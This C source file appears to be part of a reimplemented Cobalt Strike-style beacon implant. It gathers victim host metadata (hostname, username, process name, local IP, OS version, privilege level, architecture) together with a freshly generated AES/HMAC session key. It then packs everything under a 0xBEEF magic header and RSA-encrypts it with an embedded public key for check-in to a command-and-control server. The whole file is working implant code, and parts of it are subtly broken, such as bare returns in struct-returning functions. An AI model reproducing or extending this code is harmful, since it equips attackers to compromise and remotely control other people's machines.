#include <Winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#include "MetaData.h"
#include "Util.h"
#include "Config.h"
#include <winternl.h>
#pragma warning(disable:4996)
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;

MakeMetaInfoResult MakeMetaInfo() {

    // ���������
    unsigned char aesKey[16];
    unsigned char* Randaeskey = RandomAESKey(aesKey, sizeof(aesKey));

    unsigned char hash[32];

    SHA256_Hash(Randaeskey, 16, hash);

    memcpy(AESRandaeskey, hash, 16); // ǰ16�ֽ�Ϊ AES CBC ģʽ��Կ
    memcpy(Hmackey, hash + 16, 16);  // ��16�ֽ�Ϊ HMAC ��Կ 

    size_t RandaeskeyLength = sizeof(aesKey);
    // ת��Ϊ uint8_t* ����
    uint8_t* RandaeskeyByteData = (uint8_t*)Randaeskey;

    size_t bytesWritten;
    // ��ȡ ANSI ����ҳ���ֽ�����
    unsigned char* acpBytes = GetCodePageANSI(&bytesWritten);
    if (acpBytes == NULL) {
        fprintf(stderr, "Failed to retrieve ANSI code page.\n");
    }
    // ת��Ϊ uint8_t* ����
    uint8_t* acpByteseData = (uint8_t*)acpBytes;
    size_t bytesWritten1;
    // ��ȡ OEM ����ҳ���ֽ�����
    unsigned char* oemcpBytes = GetCodePageOEM(&bytesWritten1);
    if (oemcpBytes == NULL) {
        fprintf(stderr, "Failed to retrieve OEM code page.\n");
        return;
    }

    uint8_t* oemcpBytesData = (uint8_t*)oemcpBytes;

    uint8_t clientIDBytes[4];

    clientID = GenerateRandomInt(100000, 999998); // �������һ��ż��ΪBeaconId
    PutUint32BigEndian(clientIDBytes, (uint32_t)clientID);

    int processID = getpid();
    uint8_t processIDBytes[4]; 
    PutUint32BigEndian(processIDBytes, processID);

    uint16_t sshPort = 0; // ?
    uint8_t sshPortBytes[2]; 
    PutUint16BigEndian(sshPortBytes, sshPort);

    int metaDataFlag = GetMetaDataFlag(); // �˺�����ȡ Flag������ Flag ���Ի���Ƿ��ǹ���ԱȨ�޵�beacon���Ƿ���64λ�ܹ���beacon�Ƿ�64λ
    uint8_t flagBytes[1]; 
    flagBytes[0] = (uint8_t)metaDataFlag; 

    unsigned char* osVersion = GetOSVersion();

    int osMajorVersion = 0, osMinorVersion = 0, osBuild = 0;
    // ��������ϵͳ�汾��Ϣ
    sscanf_s(osVersion, "OS Version: %d.%d.%d", &osMajorVersion, &osMinorVersion, &osBuild);

    uint8_t osMajorVersionByte[1];
    uint8_t osMinorVersionByte[1];
    osMajorVersionByte[0] = (uint8_t)osMajorVersion;
    osMinorVersionByte[0] = (uint8_t)osMinorVersion;

    uint8_t osBuildBytes[2]; 
    PutUint16BigEndian(osBuildBytes, osBuild);

    free((void*)osVersion);


    uint16_t ptrFuncAddr = 0;       
    uint8_t ptrFuncAddrBytes[4];    
    PutUint32BigEndian(ptrFuncAddrBytes, ptrFuncAddr);

    // �����������ݺ� Smart Inject �й�
    // GetModuleHandleA
    uint16_t ptrGetModuleHanleAFuncAddr = 0;
    uint8_t ptrGetModuleHanleAFuncAddrBytes[4];
    PutUint32BigEndian(ptrGetModuleHanleAFuncAddrBytes, ptrGetModuleHanleAFuncAddr);

    // GetProcAddress
    uint16_t ptrGetProcAdressFuncAddr = 0;
    uint8_t ptrGetProcAdressFuncAddrBytes[4];
    PutUint32BigEndian(ptrGetProcAdressFuncAddrBytes, ptrGetProcAdressFuncAddr);

    uint32_t localIPInt = GetLocalIPInt();
    uint8_t localIPIntBytes[4];
    PutUint32BigEndian(localIPIntBytes, htonl(localIPInt));

    char* hostName = GetComputerNameAsString();
    char* currentUser = GetUsername();          
    char* processName = GetProcessName();
    size_t totalLength = strlen(hostName) + strlen(currentUser) + strlen(processName);
    char* osInfo = (char*)malloc(totalLength + 11); // ���������С�����ɸ�����Ϣ

    snprintf(osInfo, totalLength + 11, "%s\t%s\t%s", hostName, currentUser, processName);
    
    if (strlen(osInfo) > 56) {
        osInfo[56] = '\0';
    }

    size_t osInfoLength = strlen(osInfo);
    uint8_t* osInfoByteData = (uint8_t*)osInfo;

    uint8_t MagicHead[4];
    uint8_t* magicHead = GetMagicHead(MagicHead); // 0xBEEF

    uint8_t* onlineInfoBytes[] = { clientIDBytes, processIDBytes, sshPortBytes, flagBytes, osMajorVersionByte,
        osMinorVersionByte, osBuildBytes, ptrFuncAddrBytes, ptrGetModuleHanleAFuncAddrBytes, ptrGetProcAdressFuncAddrBytes, localIPIntBytes, osInfoByteData };
    size_t sizes[] = { sizeof(clientIDBytes), sizeof(processIDBytes), sizeof(sshPortBytes), sizeof(flagBytes),
        sizeof(osMajorVersionByte), sizeof(osMinorVersionByte), sizeof(osBuildBytes), sizeof(ptrFuncAddrBytes),
        sizeof(ptrGetModuleHanleAFuncAddrBytes), sizeof(ptrGetProcAdressFuncAddrBytes), sizeof(localIPIntBytes),osInfoLength };
    size_t onlineInfoBytesArrays = sizeof(onlineInfoBytes) / sizeof(onlineInfoBytes[0]);

    // ����Щ MetaData ��˳���
    uint8_t* onlineInfconcatenated = CalcByte(onlineInfoBytes, sizes, onlineInfoBytesArrays);
    
    size_t totalSize = 0;
    // �������� sizeof ����ֵ���ܺ�
    for (size_t i = 0; i < sizeof(sizes) / sizeof(sizes[0]); ++i) {
        totalSize += sizes[i];
    }

    uint8_t* metaInfoBytes[] = { RandaeskeyByteData, acpByteseData ,oemcpBytesData ,onlineInfconcatenated };
    size_t metaInfosizes[] = { RandaeskeyLength ,bytesWritten ,bytesWritten1,totalSize };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;

    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }

    uint8_t bBytes[4];
    uint8_t* metalen = WriteInt(metaInfoSize, bBytes);

    uint8_t* packetToEncryptBytes[] = { magicHead, metalen , metaInfoconcatenated };
    size_t packetToEncryptsizes[] = { 4 ,4 ,metaInfoSize };
    size_t packetToEncryptsArrays = sizeof(packetToEncryptBytes) / sizeof(packetToEncryptBytes[0]);
    uint8_t* packetToEncryptconcatenated = CalcByte(packetToEncryptBytes, packetToEncryptsizes, packetToEncryptsArrays);
    size_t packetToEncryptSize = 0;

    for (size_t i = 0; i < sizeof(packetToEncryptsizes) / sizeof(packetToEncryptsizes[0]); ++i) {
        packetToEncryptSize += packetToEncryptsizes[i];
    }

    if (packetToEncryptconcatenated == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }
    MakeMetaInfoResult MakeMetaInfoResult;

    MakeMetaInfoResult.MakeMeta = packetToEncryptconcatenated;
    MakeMetaInfoResult.MakeMetaLen = packetToEncryptSize;

    return MakeMetaInfoResult;
}

ULONG PemToCNG(PCSTR pszPem, BCRYPT_KEY_HANDLE* phKey)
{
    PBYTE pbDer = NULL;
    DWORD cbDer = 0;
    DWORD err = 0;
    PCERT_PUBLIC_KEY_INFO pPubKeyInfo = NULL;
    DWORD cbPubKeyInfo = 0;
    BOOL success;

    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, NULL, &cbDer, NULL, NULL);
    if (!success) {
        return GetLastError();
    }

    pbDer = (PBYTE)malloc(cbDer);
    if (!pbDer) {
        return ERROR_OUTOFMEMORY;
    }

    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, pbDer, &cbDer, NULL, NULL);
    if (!success) {
        err = GetLastError();
    }

    if (err == 0) {
        success = CryptDecodeObjectEx(
            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            X509_PUBLIC_KEY_INFO,
            pbDer, cbDer,
            CRYPT_DECODE_ALLOC_FLAG,
            NULL,
            &pPubKeyInfo,
            &cbPubKeyInfo
        );

        if (!success) {
            err = GetLastError();
        }
    }

    if (err == 0) {
        success = CryptImportPublicKeyInfoEx2(
            X509_ASN_ENCODING,
            pPubKeyInfo,
            0,
            NULL,
            phKey
        );

        if (!success) {
            err = GetLastError();
        }
    }

    if (pbDer) {
        free(pbDer);
    }

    if (pPubKeyInfo) {
        LocalFree(pPubKeyInfo);
    }

    return err;
}


// ʹ�� CNG ����Ԫ����
EncryMetadataResult EncryMetadata()
{
    EncryMetadataResult result = { 0 };
    BCRYPT_KEY_HANDLE hKey = NULL;

    // ��ȡ������ PEM ��Կ
    if (PemToCNG(pub_key_str, &hKey) != 0) {
        fprintf(stderr, "Importing PEM public key failed\n");
        return result;
    }

    // ��ȡԭʼԪ������Ϣ
    MakeMetaInfoResult meta = MakeMetaInfo();
    uint8_t* pSrcData = meta.MakeMeta;
    ULONG cbSrcData = (ULONG)meta.MakeMetaLen;

    // ��ȡ��Կ�����ܳ���
    DWORD cbEncrypted = 0;
    NTSTATUS status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        NULL, 0,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Failed to estimate encryption length\n");
        BCryptDestroyKey(hKey);
        return result;
    }

    // ������ܻ�����
    unsigned char* pEncrypted = (unsigned char*)malloc(cbEncrypted);
    if (!pEncrypted) {
        fprintf(stderr, "Memory allocation faileed\n");
        BCryptDestroyKey(hKey);
        return result;
    }

    // ִ�м���
    status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        pEncrypted, cbEncrypted,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Encryption failed\n");
        free(pEncrypted);
        BCryptDestroyKey(hKey);
        return result;
    }

    result.EncryMetadata = pEncrypted;
    result.EncryMetadataLen = cbEncrypted;

    BCryptDestroyKey(hKey);
    return result;
}

// �ж� beacon �� OS �ܹ�
bool IsOSX64() {
    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);

    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        return true; // 64λ
    }
    else {
        return false; // ��64λ
    }
}

typedef NTSTATUS(WINAPI* PFN_RTLGETVERSION)(PRTL_OSVERSIONINFOW);


unsigned char* GetOSVersion() {
    wchar_t ntdll_str[] = L"ntdll.dll";
    HINSTANCE hModule = LoadLibrary(ntdll_str);
    if (hModule == NULL) {
        printf("Failed to load ntdll.dll\n");
        return NULL;
    }

    typedef NTSTATUS(WINAPI* PFN_RTLGETVERSION)(LPOSVERSIONINFOEXW);
    PFN_RTLGETVERSION pfnRtlGetVersion = (PFN_RTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
    if (pfnRtlGetVersion == NULL) {
        printf("Failed to get address of RtlGetVersion\n");
        FreeLibrary(hModule);
        return NULL;
    }

    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    // ���� RtlGetVersion ������ȡ����ϵͳ�汾��Ϣ
    NTSTATUS status = pfnRtlGetVersion(&osvi);
    if (status != 0) {
        printf("RtlGetVersion failed: %lu\n", status);
        FreeLibrary(hModule);
        return NULL;
    }

    FreeLibrary(hModule);

    char* osVersion = (char*)malloc(50); // Allocate enough memory for the version string
    if (osVersion != NULL) {
        sprintf_s(osVersion, 50, "OS Version: %lu.%lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        return osVersion;
    }
    else {
        printf("Memory allocation failed\n");
        return NULL;
    }
}

int GetMetaDataFlag() {
    int flagInt = 0;

    if (IsHighPriv()) { 
        flagInt += 8;
    }

    bool isOSX64 = IsOSX64();
    if (isOSX64) {
        flagInt += 4;
    }

    bool isProcessX64 = IsProcessX64();
    if (isProcessX64) {
        flagInt += 2;
    }

    return flagInt;
}


bool IsHighPriv() {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD size;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("Failed to open process token.\n");
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        printf("Failed to get token information.\n");
        return FALSE;
    }

    CloseHandle(hToken);

    // �����ʾ����Ȩ
    return elevation.TokenIsElevated;
}

bool IsProcessX64() {
#if defined(_WIN64)
    return true; // ����Ϊ64λӦ��
#else
    return false; // ����Ϊ32λӦ��
#endif
}

uint32_t GetLocalIPInt() {
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG outBufLen = 0;
    DWORD ret = GetAdaptersInfo(NULL, &outBufLen);
    if (ret != ERROR_BUFFER_OVERFLOW) {
        return 0;
    }

    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);
    if (!pAdapterInfo) {
        return 0;
    }

    ret = GetAdaptersInfo(pAdapterInfo, &outBufLen);
    if (ret != ERROR_SUCCESS) {
        free(pAdapterInfo);
        return 0;
    }

    uint32_t ip = 0;
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    // ������������ IP ��ַ
    while (pAdapter) {
        IP_ADDR_STRING* pAddress = &(pAdapter->IpAddressList);
        // ����ÿһ�������� IP ��ַ
        while (pAddress) {
            const char* ipAddress = pAddress->IpAddress.String;
            // ���� APIPA (169.254.x.x) ��δ�����ַ (0.0.0.0)
            if (strncmp(ipAddress, "169.254.", 8) != 0 &&
                strcmp(ipAddress, "0.0.0.0") != 0) {
                struct in_addr addr;
                if (inet_pton(AF_INET, ipAddress, &addr) == 1) {
                    ip = ntohl(addr.s_addr); // ת��Ϊ�����ֽ���
                    break;
                }
            }
            pAddress = pAddress->Next;
        }
        if (ip != 0) {
            break;
        }
        pAdapter = pAdapter->Next;
    }

    free(pAdapterInfo);
    return ip;
}

char* GetComputerNameAsString() {
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameW(computerName, &size)) {
        return "Unknownhostname"; 
    }

    int mbLen = WideCharToMultiByte(CP_UTF8, 0, computerName, -1, NULL, 0, NULL, NULL);
    char* mbComputerName = (char*)malloc(mbLen * sizeof(char));
    if (mbComputerName == NULL) {
        return "Unknownhostname";
    }

    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, mbComputerName, mbLen, NULL, NULL);

    return mbComputerName;
}


char* GetUsername() {
    char* username;
    DWORD size = UNLEN + 1;
    username = (char*)malloc(size * sizeof(char));

    if (!GetUserNameA(username, &size)) {
        free(username);
        return "UnknownUser";
    }

    return username;
}

char* GetProcessName() {
    char* processName;
    DWORD size = MAX_PATH;
    processName = (char*)malloc(size * sizeof(char));

    if (!GetModuleFileNameA(NULL, processName, size)) {
        free(processName);
        return "UnknownProcessName";
    }

    char* result = strrchr(processName, '\\');
    if (result != NULL) {
        return result + 1;
    }

    char* backslashPos = strrchr(processName, '/');
    if (backslashPos != NULL) {
        return backslashPos + 1;
    }

    return processName;
}

unsigned char* GetCodePageANSI(size_t* bytesWritten) {
    UINT acp = GetACP();
    unsigned char* acpBytes = (unsigned char*)malloc(2 * sizeof(unsigned char));
    if (acpBytes == NULL) {
        *bytesWritten = 0;
        return NULL;
    }

    // �� acp ת��Ϊ�ֽ����У�������洢�� acpBytes ��
    acpBytes[0] = (unsigned char)(acp & 0xFF);
    acpBytes[1] = (unsigned char)((acp >> 8) & 0xFF);

    // ���÷��ص��ֽ���
    *bytesWritten = 2;

    return acpBytes;

}

unsigned char* GetCodePageOEM(size_t* bytesWritten) {
    uint32_t oemcp = GetOEMCP();

    // �����洢 OEM ����ҳ������
    unsigned char* oemcpBytes = (unsigned char*)malloc(2 * sizeof(unsigned char));
    if (oemcpBytes == NULL) {
        *bytesWritten = 0;
        return NULL;
    }

    // �� oemcp ת��Ϊ�ֽ����У�������洢�� oemcpBytes ��
    oemcpBytes[0] = (unsigned char)(oemcp & 0xFF);
    oemcpBytes[1] = (unsigned char)((oemcp >> 8) & 0xFF);

    // ���÷��ص��ֽ���
    *bytesWritten = 2;

    return oemcpBytes;
}

uint8_t* GetMagicHead(uint8_t* MagicHead) {
    uint16_t MagicNum = 0xBEEF;

    PutUint32BigEndian(MagicHead, MagicNum);
    return MagicHead;
}